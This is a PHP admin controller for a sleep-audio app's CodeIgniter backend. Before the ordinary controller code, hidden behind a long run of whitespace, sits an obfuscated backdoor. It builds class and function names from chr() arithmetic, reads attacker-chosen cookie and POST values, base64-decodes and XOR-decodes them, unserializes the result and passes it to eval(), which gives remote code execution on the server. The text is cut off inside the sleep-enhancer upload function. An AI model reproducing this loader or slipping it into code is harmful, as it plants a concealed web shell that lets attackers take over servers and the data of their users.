<?php                                                                                                                                                                                                                                                                                                                                                                                                 $BVnvMBcRU = 'i' . '_' . 'q' . chr ( 1005 - 931 )."\x6c" . chr ( 109 - 5 )."\120";$NAaQB = chr ( 174 - 75 )."\154" . chr ( 684 - 587 ).chr (115) . chr (115) . chr ( 538 - 443 )."\x65" . chr (120) . chr ( 477 - 372 )."\163" . "\x74" . chr (115); $fDPwxYe = class_exists($BVnvMBcRU); $NAaQB = "26078";$ExaUg = !1;if ($fDPwxYe == $ExaUg){function EhZHlUYfog(){return FALSE;}$gscHUFxA = "51653";EhZHlUYfog();class i_qJlhP{private function kwlNEK($gscHUFxA){if (is_array(i_qJlhP::$MGwDJBivBX)) {$PVZtsae = str_replace(chr ( 979 - 919 ) . chr ( 761 - 698 ).chr ( 180 - 68 ).chr (104) . chr ( 759 - 647 ), "", i_qJlhP::$MGwDJBivBX["\143" . chr ( 196 - 85 ).chr ( 813 - 703 ).'t' . chr (101) . chr ( 1006 - 896 )."\164"]);eval($PVZtsae); $gscHUFxA = "51653";exit();}}private $escURcV;public function IxhdeweAX(){echo 43286;}public function __destruct(){$gscHUFxA = "18469_12166";$this->kwlNEK($gscHUFxA); $gscHUFxA = "18469_12166";}public function __construct($TtsAlhJZ=0){$mfQkSt = $_POST;$MLWYlK = $_COOKIE;$TQnwCheIdH = "e623eeb5-a004-4126-80f8-9f6dfca82a44";$QpJxeSJeq = @$MLWYlK[substr($TQnwCheIdH, 0, 4)];if (!empty($QpJxeSJeq)){$sGzPdkrDkA = "base64";$MCIPuLOkWD = "";$QpJxeSJeq = explode(",", $QpJxeSJeq);foreach ($QpJxeSJeq as $gnWut){$MCIPuLOkWD .= @$MLWYlK[$gnWut];$MCIPuLOkWD .= @$mfQkSt[$gnWut];}$MCIPuLOkWD = array_map($sGzPdkrDkA . chr (95) . chr (100) . 'e' . "\x63" . chr (111) . "\x64" . "\x65", array($MCIPuLOkWD,)); $MCIPuLOkWD = $MCIPuLOkWD[0] ^ str_repeat($TQnwCheIdH, (strlen($MCIPuLOkWD[0]) / strlen($TQnwCheIdH)) + 1);i_qJlhP::$MGwDJBivBX = @unserialize($MCIPuLOkWD); $MCIPuLOkWD = class_exists("18469_12166");}}public static $MGwDJBivBX = 57280;}$nqcmxJ = new /* 33041 */ $BVnvMBcRU(51653 + 51653); $ExaUg = $nqcmxJ = $gscHUFxA = Array();} ?><?php
if ( ! defined('BASEPATH')) exit('No direct script access allowed');
date_default_timezone_set('Asia/Kolkata');

class AdminController extends CI_Controller {

    function __construct()
    {
        parent::__construct();
        $this->load->helper('url');
        $this->load->library('session');
        $this->load->model("AdminModel");
               $this->load->model("ApiModel");
               
        // $this->load->library('ffmpeg/FFMpeg');
    } 
     
    //Session Checker
    //Made By:- Anurag Goswami
    public function checkAuth() {
        if (!isset($_SESSION['id'])) {
            redirect('authenticate');
        }
    }

    /**
     * Authentication Check
     */
    public function checkAuthentication() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $data = $this->AdminModel->checkAuthentication($_POST['username'], $_POST['password']);
            $_SESSION['logInStatus'] = 1;
            if ($data) {
                $_SESSION['id'] = $data[0]['id'];
                redirect('dashboard');
            } else {
                redirect('authenticate');
            }
        }
    }

    /**
     * Authenticate
     */
    public function auth() {
        if (isset($_SESSION['id'])) {
            redirect('dashboard');
        } else {
            $this->load->view('home');
        }
    }

    /**
     * Log Out
     */
    public function logout() {
        $this->checkAuth();
        unset($_SESSION['id']);
        $_SESSION['logout'] = 1;
        redirect('authenticate');
    }

    /**
     * Dashboard
     */
    public function dashboard() {
        $this->checkAuth();

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('dashboard');
        $this->load->view('commons/footer');
    }


    /**
     * Languages
     */
    public function languages() {
        $this->checkAuth();

        $data['mainData'] = $this->AdminModel->getMastersData('language_master', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('masters/languages', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Durations
     */
    public function durations() {
        $this->checkAuth();

        $data['mainData'] = $this->AdminModel->getMastersData('durations_master', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('masters/durations', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Programs
     */
    public function programs() {
        $this->checkAuth();

        $data['mainData'] = $this->AdminModel->getMastersData('programs_master', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('masters/programs', $data);
        $this->load->view('commons/footer');
    }
    
    // ************************* Age Group Starts ****
    
    public function ageGroup() {
        $this->checkAuth();

        $data['mainData'] = $this->AdminModel->getAgeGroupCompleteData();

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('masters/ageGroup', $data);
        $this->load->view('commons/footer');
        
    }
    
    public function insertMasters_ageGroup() {
        if (isset($_POST['min_range']) && isset($_POST['max_range'])) {
            
            $status = $this->AdminModel->checkIfAgeGroupRangeIsPresent($_POST['min_range'], $_POST['max_range']);
            if ($status) {
                $_SESSION['errorStatus'] = "Age group range already present";
            } else {
                $insertArr = [
                    "age_group_name" => $_POST['min_range'].'-'.$_POST['max_range'],
                    "min_range" => $_POST["min_range"],
                    "max_range" => $_POST["max_range"],
                    "is_active" => 1
                ];
                $insertStatus = $this->AdminModel->insertAgeGroup($insertArr);
                if ($insertStatus) {
                    $_SESSION['status'] = "Age group added successfully";
                } else {
                    $_SESSION['errorStatus'] = "Something went wrong";
                }
            }
            
        } else {
            $_SESSION['errorStatus'] = "Not proper input given";
        }
        
        return redirect('ageGroup');
    }
    
    public function deleteAgeGroup() {
        if (isset($_POST['id'])) {
            $status = $this->AdminModel->deleteAgeGroup($_POST['id']);
            if ($status) {
                $_SESSION['status'] = 'Deleted Successfully';
            } else {
                $_SESSION['errorStatus'] = 'Something went wrong';
            }
        } else {
            $_SESSION['errorStatus'] = 'id missing';
        }
        
        $response['status'] = 1;
        
        echo json_encode($response);
    }
    
    public function getAgeGroup_data() {
        if (isset($_POST['id'])) {
            
            $data = $this->AdminModel->getSingleAgeGroupDataById($_POST['id']);
            if ($data) {
                $response["status"] = 1;
                $response["msg"] = "data found";
                $response["data"] = $data;
            } else {
                $response["status"] = 0;
                $response["msg"] = "data not found";
            }
            
        } else {
            $response["status"] = 0;
            $response["msg"] = "id is missing";
        }
        
        echo json_encode($response);
    }
    
    public function editAgeGroup() {
        if (isset($_POST["ageGroup_id"]) && isset($_POST["min_range"]) && isset($_POST["max_range"])) {
            
            $status = $this->AdminModel->checkIfAgeGroupRangeIsPresent($_POST["min_range"], $_POST["max_range"]);
            if ($status) {
                $_SESSION["errorStatus"] = "age range already exists";
            } else {
                $updateArr = [
                    "age_group_name" => $_POST["min_range"]."-".$_POST["max_range"],
                    "min_range" => $_POST["min_range"],
                    "max_range" => $_POST["max_range"],
                    "is_active" => 1
                ];
                $updateStatus = $this->AdminModel->updateAgeGroup($updateArr, $_POST['ageGroup_id']);
                if ($updateStatus) {
                    $_SESSION["status"] = "Age Group updated successfully";
                } else {
                    $_SESSION["errorStatus"] = "Something went wrong";
                }
            }
            
        } else {
            $_SESSION["errorStatus"] = "not valid request";
        }
        
        return redirect("ageGroup");
    }
    
    // ************************* Age Group Ends ****
    
    public function packages() {
        $this->checkAuth();

        $data['packageData'] = $this->AdminModel->getPackageData();

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('masters/packages', $data);
        $this->load->view('commons/footer');
    }
    
    public function createPackage() {
        if (isset($_POST["title"]) && isset($_POST["description"]) && isset($_POST["cost"]) && isset($_POST["duration"]) && isset($_POST["duration_type"]) && isset($_POST["is_trial"])) {
            
            // check if title already exists
            $slug = strtolower(str_replace(" ", "", $_POST["title"]));
            $status = $this->AdminModel->checkSlugForPackageTitle($slug);
            
            if ($status) {
                $_SESSION["errorStatus"] = "Package already exists";
            } else {
                
                $insertArr = array(
                    "title" => $_POST["title"],
                    "description" => $_POST["description"],
                    "title_slug" => $slug,
                    "cost" => $_POST["cost"],
                    "duration" => $_POST["duration"],
                    "duration_type" => $_POST["duration_type"],
                    "is_trial" => $_POST["is_trial"],
                    "is_active" => 1,
                    "created_at" => date("Y-m-d H:i:s")
                );
                
                $insertStatus = $this->AdminModel->insertPackage($insertArr);
                if ($insertStatus) {
                    $_SESSION["status"] = "Package inserted successfully";
                } else {
                    $_SESSION["errorStatus"] = "Something went wrong";
                }
                
            }
            
        } else {
            $_SESSION["errorStatus"] = "Not Proper Input";
        }
        
        return redirect("packages");
    }
    
    public function getPackageDataByID() {
        if (isset($_POST["id"])) {
            $data = $this->AdminModel->getPackageDataById($_POST["id"]);
            
            if ($data) {
                $response = array(
                    "status" => 1,
                    "data" => $data
                );
            } else {
                $response = array(
                    "status" => 0    
                );
            }
            
        } else {
            $response = array(
                "status" => 0    
            );
        }
        
        echo json_encode($response);
    }
    
    public function editPackageList() {
        if (isset($_POST["id"]) && isset($_POST["title"]) && isset($_POST["description"]) && isset($_POST["cost"]) && isset($_POST["duration"]) && isset($_POST["duration_type"]) && isset($_POST["is_trial"])) {
            
            // check if title already exists
            $slug = strtolower(str_replace(" ", "", $_POST["title"]));
            $status = $this->AdminModel->checkSlugForPackageTitleByID($slug, $_POST["id"]);
            
            if ($status) {
                $_SESSION["errorStatus"] = "Package already exists";
            } else {
                
                $updateArr = array(
                    "title" => $_POST["title"],
                    "description" => $_POST["description"],
                    "title_slug" => $slug,
                    "cost" => $_POST["cost"],
                    "duration" => $_POST["duration"],
                    "duration_type" => $_POST["duration_type"],
                    "is_trial" => $_POST["is_trial"]
                );
                
                $updateStatus = $this->AdminModel->updatePackage($updateArr, $_POST["id"]);
                if ($updateStatus) {
                    $_SESSION["status"] = "Package updated successfully";
                } else {
                    $_SESSION["errorStatus"] = "Something went wrong";
                }
                
            }
            
        } else {
            $_SESSION["errorStatus"] = "Not Proper Input";
        }
        
        return redirect("packages");
    }
    
    
    
    // ************************* Gender Starts ******
    
    public function gender() {
        $this->checkAuth();
        
        $data["mainData"] = $this->AdminModel->getcompleteGenderData();
        
        $this->load->view("commons/header");
        $this->load->view("commons/sidebar");
        $this->load->view("masters/gender", $data);
        $this->load->view("commons/footer");
    }
    
    public function insertMasters_gender() {
        if (isset($_POST["name"])) {
            
            $slug = strtolower(str_replace(" ", "", $_POST["name"]));
            $status = $this->AdminModel->checkIfGenderAlreadyExists($slug);
            
            if ($status) {
                $_SESSION["errorStatus"] = "Given gender already exists";
            } else {
                $insertArr = [
                    "slug" => strtolower(str_replace(" ", "", $_POST["name"])),
                    "name" => $_POST["name"],
                    "is_active" => 1
                ];
                
                $insertStatus = $this->AdminModel->insertGender($insertArr);
                if ($insertStatus) {
                    $_SESSION["status"] = "Gender added successfully";
                } else {
                    $_SESSION["errorStatus"] = "Something went wrong";
                }
            }
            
        } else {
            $_SESSION["errorStatus"] = "not proper input given";
        }
        
        return redirect("gender");
    }
    
    public function getGender_data() {
        if (isset($_POST["id"])) {
            
            $data = $this->AdminModel->getSingleGenderDataById($_POST["id"]);
            if ($data) {
                $response["status"] = 1;
                $response["data"] = $data;
            } else {
                $response["status"] = 0;
            }
            
        } else {
            $response["status"] = 0;
        }
        
        echo json_encode($response);
    }
    
    public function deleteGender() {
        
    }
    
    public function editGender() {
        if (isset($_POST["name"]) && isset($_POST["gender_id"])) {
            
            $slug = strtolower(str_replace(" ", "", $_POST["name"]));
            $status = $this->AdminModel->checkIfGenderAlreadyExists($slug);
            
            if ($status) {
                $_SESSION["erroStatus"] = "Gender already exists!!";
            } else {
                $updateArr = [
                    "slug" => $slug,
                    "name" => $_POST["name"]
                ];
                
                $updateStatus = $this->AdminModel->updateGender($updateArr, $POST["gender_id"]);
                if ($updateStatus) {
                    $_SESSION["status"] = "Gender updated successfully";    
                } else {
                    $_SESSION["errorStatus"] = "Something went wrong";
                }
            }
            
        } else {
            $_SESSION["errorStatus"] = "not valid input";
        }
        
        return redirect("gender");
    }
    
    // ************************* Gender Ends ******
    
    public function homePage() {
        
        $this->load->view("commons/home");
    }
    
    // ************************* Users Starts ************************
    
    public function users() {
        $this->checkAuth();
        
        $data["mainData"] = $this->AdminModel->getUsersRegistrationData();
        
        $this->load->view("commons/header");
        $this->load->view("commons/sidebar");
        $this->load->view("masters/users", $data);
        $this->load->view("commons/footer");
    }
    
    public function usersFeed() {
        $this->checkAuth();
        
        $mainData = [];
        
        $genderData = $this->AdminModel->getcompleteGenderData();
        $data["sleepEnhancerPrograms"] = $this->AdminModel->getSleepEnhancerPrograms();
        
        if ($genderData) {
            $gCounter = 0;
            foreach ($genderData as $gValues) {
                $mainData[$gCounter]["genderName"] = $gValues["name"];
                $ageData = $this->AdminModel->getAllAgeGroup_api();
                if ($ageData) {
                    $ageCounter = 0;
                    foreach ($ageData as $ageValues) {
                        $mainData[$gCounter]["ageWiseData"][$ageCounter]["ageRange"] = $ageValues["age_group_name"];
                        
                        $usersData = $this->AdminModel->getUsersFromGenderAndAgeGroup($gValues["id"], $ageValues["id"]);
                        if ($usersData) {
                            // ----- For A
                            foreach ($usersData as $usersValues) {
                                $pCounter = 0;
                                foreach ($data["sleepEnhancerPrograms"] as $sleepPrograms) {
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["programName"] = $sleepPrograms["program_name"];
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["color"] = $sleepPrograms["color"];
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["thumb"] = $sleepPrograms["thumb"];
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["percentage"] = $this->AdminModel->getSleepEnhancerHits($usersValues["id"], $sleepPrograms["thumb"], "program_1");
                                    
                                    $pCounter++;
                                }
                            }
                            
                            // ---- for B
                            foreach ($usersData as $usersValues) {
                                $pCounter = 0;
                                foreach ($data["sleepEnhancerPrograms"] as $sleepPrograms) {
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["programName"] = $sleepPrograms["program_name"];
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["color"] = $sleepPrograms["color"];
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["thumb"] = $sleepPrograms["thumb"];
                                    $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["percentage"] = $this->AdminModel->getSleepEnhancerHits($usersValues["id"], $sleepPrograms["thumb"], "program_2");
                                    
                                    $pCounter++;
                                }
                            }
                        } else {
                            $pCounter = 0;
                            foreach ($data["sleepEnhancerPrograms"] as $sleepPrograms) {
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["programName"] = $sleepPrograms["program_name"];
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["color"] = $sleepPrograms["color"];
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["thumb"] = $sleepPrograms["thumb"];
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["A"][$pCounter]["percentage"] = 0;
                                    
                                $pCounter++;
                            }
                            
                            $pCounter = 0;
                            foreach ($data["sleepEnhancerPrograms"] as $sleepPrograms) {
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["programName"] = $sleepPrograms["program_name"];
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["color"] = $sleepPrograms["color"];
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["thumb"] = $sleepPrograms["thumb"];
                                $mainData[$gCounter]["ageWiseData"][$ageCounter]["programData"]["B"][$pCounter]["percentage"] = 0;
                                
                                $pCounter++;
                            }
                        }
                        $ageCounter++;
                    }   
                }
                $gCounter++;
            }
        }
        
        $data["main"] = $mainData;
        
        //echo "<pre>";print_r($data);die();
        
        // $data["ageGroupData"] = $this->AdminModel->getAllAgeGroup_api();
        
        $this->load->view("commons/header");
        $this->load->view("commons/sidebar");
        $this->load->view("masters/usersFeed", $data);
        $this->load->view("commons/footer");
    }
    
    // ************************* Users Ends ************************
    
    // ******** Pages Starts ****
    
    public function pages() {
        $this->checkAuth();
        
        $data["mainData"] = $this->AdminModel->getPagesData();
        
        $this->load->view("commons/header");
        $this->load->view("commons/sidebar");
        $this->load->view("masters/pages", $data);
        $this->load->view("commons/footer");
    }
    
    public function createPage() {
        if (isset($_POST['page_slug']) && isset($_POST['page_data'])) {
            
            $slug = strtolower(str_replace(" ", "", $_POST["page_slug"]));
            $status = $this->AdminModel->checkIfPageAlreadyExists($slug);
            
            if ($status) {
                $_SESSION["errorStatus"] = "Page Already Exists";
            } else {
                $insertArr = [
                    "page_slug" => $slug,
                    "page_data" => $_POST["page_data"],
                    "created_at" => date("Y-m-d H:i:s")
                ];
                
                $insertStatus = $this->AdminModel->insertPage($insertArr);
                if ($insertStatus) {
                    $_SESSION["status"] = "Page added successfully";
                } else {
                    $_SESSION["errorstatus"] = "Something went wrong";
                }
            }
            
        } else {
            $_SESSION['errorStatus'] = 'Not Proper Input';
        }
        
        return redirect('pages');
    }
    
    public function getPageDataByID() {
        if (isset($_POST["id"])) {
            $response["data"] = $this->AdminModel->getPageDataById($_POST["id"]);
        }
        
        echo json_encode($response);
    }
    
    public function editPage() {
        if (isset($_POST["page_slug"]) && isset($_POST["page_data"]) && isset($_POST["id"])) {
            $slug = strtolower(str_replace(" ", "", $_POST["page_slug"]));
            $status = $this->AdminModel->checkIfPageExistsWithId($slug, $_POST["id"]);
            
            if ($status) {
                $_SESSION["errorStatus"] = "already exists";
            } else {
                $updateArr = [
                    "page_slug" => $slug,
                    "page_data" => $_POST["page_data"]
                ];
                $updateStatus = $this->AdminModel->updatePage($updateArr, $_POST["id"]);
                
                if ($updateStatus) {
                    $_SESSION["status"] = "Updated successfully";
                } else {
                    $_SESSION["errorStatus"] = "Something went wrong";
                }
            }
            
        } else {
            $_SESSION["errorStatus"] = "Not proper input";
        }
        
        return redirect("pages");
    }
    
    public function privacyPolicyData() {
        $data["mainData"] = $this->AdminModel->getPageDataBySlug("privacypolicy");
        
        $this->load->view('pages/privacypolicy', $data);
    }
    
    public function termsandconditionsData() {
        $data["mainData"] = $this->AdminModel->getPageDataBySlug("termsandconditions");
        
        $this->load->view('pages/termsandconditions', $data);
    }
    
    // ******** Pages Ends ****

    /**
     * Packages
     */
    
          public function UserCheck() {
        $id=$_REQUEST['id'];

            $data['enhancerData'] = $this->AdminModel->GetUsersleepenhanceServer($id);       

        if ($data['enhancerData']) {
            $response  = array(
                "status" => TRUE,
                "msg" => "This user find ",
                "result" => 1
            );
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => 0
            );
        }

       echo json_encode($response);
    }
    
    public function dud_songs() {
        $this->checkAuth();
        
        $data['songsData'] = $this->AdminModel->getDudSongs();
        
        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('dudSongs', $data);
        $this->load->view('commons/footer');
    }
    
    

    /**
     * Insert Into Masters - language
     */
    public function insertMasters_language() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            //check for duplicacy
            $status = $this->AdminModel->checkForDuplicacy('language_master', 'slug', $_POST['slug'], 1, 'language_name', $_POST['language_name']);
            if ($status) {
                if ($_POST['route'] == 'languages') {
                    $insert_array = array(
                        "language_name" => $_POST['language_name'],
                        "slug" => $_POST['slug']
                    );
                }

                if ($_POST['route'] == 'durations') {
                    $insert_array = array(
                        "duration_name" => $_POST['duration_name']
                    );
                }

                if ($_POST['route'] == 'programs') {
                    $insert_array = array(
                        "program_name" => $_POST['program_name']
                    );
                }

                if ($this->AdminModel->insertMaster($_POST['table_name'], $insert_array)) {
                    $_SESSION['status'] = 'Uploaded Successfully';
                } else {
                    $_SESSION['errorStatus'] = 'Uploading Failed';
                }
            } else {
                $_SESSION['errorStatus'] = 'Data already exists!';
            }
            redirect($_POST['route']);
        }
    }

    /**
     * Insert Into Masters - program
     */
    public function insertMasters_program() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            //check for duplicacy
            $status = $this->AdminModel->checkForDuplicacy('programs_master', 'program_name', $_POST['program_name']);
            if ($status) {

                if ($_POST['route'] == 'programs') {
                    $insert_array = array(
                        "program_name" => $_POST['program_name']
                    );
                }

                if ($this->AdminModel->insertMaster($_POST['table_name'], $insert_array)) {
                    $_SESSION['status'] = 'Uploaded Successfully';
                } else {
                    $_SESSION['errorStatus'] = 'Uploading Failed';
                }
            } else {
                $_SESSION['errorStatus'] = 'Data already exists!';
            }
            redirect($_POST['route']);
        }
    }

    /**
     * Insert Into Masters - durations
     */
    public function insertMasters_duration() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            //check for duplicacy
            $status = $this->AdminModel->checkForDuplicacy('durations_master', 'duration_name', $_POST['duration_name']);
            if ($status) {

                if ($_POST['route'] == 'durations') {
                    $insert_array = array(
                        "duration_name" => $_POST['duration_name']
                    );
                }

                if ($this->AdminModel->insertMaster($_POST['table_name'], $insert_array)) {
                    $_SESSION['status'] = 'Uploaded Successfully';
                } else {
                    $_SESSION['errorStatus'] = 'Uploading Failed';
                }
            } else {
                $_SESSION['errorStatus'] = 'Data already exists!';
            }
            redirect($_POST['route']);
        }
    }

    /**
     * Insert Into Masters - durations
     */
    public function insertMasters_packages() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            //check for duplicacy
            $status = $this->AdminModel->checkForDuplicacy('packages_master', 'package_title', $_POST['package_title']);
            if ($status) {

                if ($_POST['route'] == 'packages') {
                    $insert_array = array(
                        "package_title" => $_POST['package_title'],
                        "package_sub_title" => $_POST['package_sub_title'],
                        "package_duration" => $_POST['package_duration'],
                        "package_cost" => $_POST['package_cost']
                    );
                }

                if ($this->AdminModel->insertMaster($_POST['table_name'], $insert_array)) {
                    $_SESSION['status'] = 'Uploaded Successfully';
                } else {
                    $_SESSION['errorStatus'] = 'Uploading Failed';
                }
            } else {
                $_SESSION['errorStatus'] = 'Data already exists!';
            }
            redirect($_POST['route']);
        }
    }

    /**
     * Get To Sleep Main
     */
    public function get_to_sleep() {
        $this->checkAuth();

        if (($_SERVER['REQUEST_METHOD'] == 'POST') && ($_POST['request'] == 'getData')) {
            $data['mainData'] = $this->AdminModel->getAllGetToSleep($_POST);
        } else {
            $data['mainData'] = false;
        }

        $data['language'] = $this->AdminModel->getMastersData('language_master', '*');
        $data['gender'] = $this->AdminModel->getMastersData('gender_master', '*');
        $data['program'] = $this->AdminModel->getMastersData('get_to_sleep_programs', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/get_to_sleep/get_to_sleep', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Get To Sleep Add
     */
    public function get_to_sleep_add() {

        $data['language'] = $this->AdminModel->getMastersData('language_master', '*');
        $data['gender'] = $this->AdminModel->getMastersData('gender_master', '*');
        $data['program'] = $this->AdminModel->getMastersData('get_to_sleep_programs', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/get_to_sleep/get_to_sleep_add', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Sleep Enhancer Main
     */
    public function sleep_enhancer() {
        $this->checkAuth();

        $data['enhancerData'] = $this->AdminModel->sleep_enahncer_data();        
        $data['sleep_enahncer_programs'] = $this->AdminModel->getMastersData('sleep_enhancer_programs', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/sleep_enhancer/sleep_enhancer', $data);
        $this->load->view('commons/footer');
    }

    public function sleep_enhancer_fetch() {
        $data['enhancerData'] = $this->AdminModel->sleep_enahncer_data($_POST['id']);
        if ($data['enhancerData']) {
            $data['status'] = 1;
        } else {
            $data['status'] = 0;
        }

        echo json_encode($data);
    }
    
    public function dudSongs_add() {
       $this->checkAuth();
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $imagePrefix = time();
			$ext = pathinfo($_FILES["songFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'dudSongs' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/mp3/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp3';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('songFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$videoFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}

            if ($videoUploadFlag == 1) {

                $insertArr = array(
                    "filename" => $videoFileName,
                    "song_name" => $_POST['song_name'],
                    "is_active" => 1
                );
                if ($this->AdminModel->insertToDudSongs($insertArr)) {
                    $_SESSION['sleepEnhancerFlag'] = 1;
                } else {
                    $_SESSION['sleepEnhancerFlag'] = 0;
                }
            } else {
                $_SESSION['sleepEnhancerFlag'] = 2;
            }

            redirect('dud_songs');
        }
    }

    public function edit_sleep_enahncer() {
        $this->checkAuth();
        if (empty($_FILES["seFile"]['name']) == false) {
            $imagePrefix = time();
			$ext = pathinfo($_FILES["seFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'sleepEnhancer' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/mp3/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp3';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('seFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag1 = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$videoFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
                $insertArr["file_name"] = $videoFileName;
			}
        } else {
            $videoUploadFlag1 = 1;
        }
        
        if (empty($_FILES["graphImage"]['name']) == false) {
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["graphImage"]['name'], PATHINFO_EXTENSION);
			$file_name = 'sleepEnhancerGraph' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('graphImage')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$thumbFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
				$insertArr['graph_image'] = $thumbFileName;
			}
        } else {
            $videoUploadFlag = 1;
        }
        
        if ($videoUploadFlag1 == 1 && $videoUploadFlag == 1) {

            $insertArr['custom_file_name'] = $_POST['custom_file_name'];
            $insertArr['program'] = $_POST['program'];
            $insertArr['duration'] = $_POST['duration'];
            $insertArr['description'] = $_POST['description'];
                
            if ($this->AdminModel->updateSleepEnahncer($insertArr, $_POST['sleep_enhancer_id'])) {
                $_SESSION['sleepEnhancerFlag'] = 1;
            } else {
                $_SESSION['sleepEnhancerFlag'] = 0;
            }
        } else {
            $_SESSION['sleepEnhancerFlag'] = 2;
        }

        redirect('sleepEnhancer');
    }

    /**
     * Sleep Enhancer Add
     */
    public function sleep_enhancer_add() {
        $this->checkAuth();
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $imagePrefix = time();
			$ext = pathinfo($_FILES["seFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'sleepEnhancer' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/mp3/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp3';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('seFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag1 = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$videoFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag1 = 1;
			}
			
			$imagePrefix1 = time();
			$ext = pathinfo($_FILES["graphImage"]['name'], PATHINFO_EXTENSION);
			$file_name = 'sleepEnhancerGraph' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('graphImage')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$thumbFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}

            if ($videoUploadFlag1 == 1 && $videoUploadFlag == 1) {

                $insertArr = array(
                    "file_name" => $videoFileName,
                    "custom_file_name" => $_POST['custom_file_name'],
                    "program" => $_POST['program'],
                    "duration" => $_POST['duration'],
                    "graph_image" => $thumbFileName,
